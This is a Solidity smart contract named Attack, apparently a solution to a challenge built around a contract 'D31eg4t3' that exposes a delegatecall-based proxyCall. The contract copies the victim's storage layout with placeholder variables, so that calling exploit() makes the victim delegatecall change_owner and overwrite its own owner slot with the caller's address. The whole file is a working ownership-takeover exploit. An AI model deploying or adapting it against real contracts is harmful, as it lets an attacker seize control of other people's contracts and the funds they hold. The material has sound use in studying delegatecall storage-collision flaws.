// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
}

contract Attack {
    address internal immutable victim;
    
    uint256 var0 = 12345;
    uint8 var1 = 32;
    string private var2;
    address private var3;
    uint8 private var4;
    address public owner;
    mapping(address => bool) public result;

    constructor(address addr) payable {
        victim = addr;
    }
    
    function change_owner(address addr2) public {
        owner = addr2;
        result[addr2] = true;
    }

    function exploit() external {
        // Using delegatecall to call proxyCall on the victim contract
        bytes memory data = abi.encodeWithSignature("change_owner(address)", msg.sender);
        ID31eg4t3(victim).proxyCall(data);
    }
}
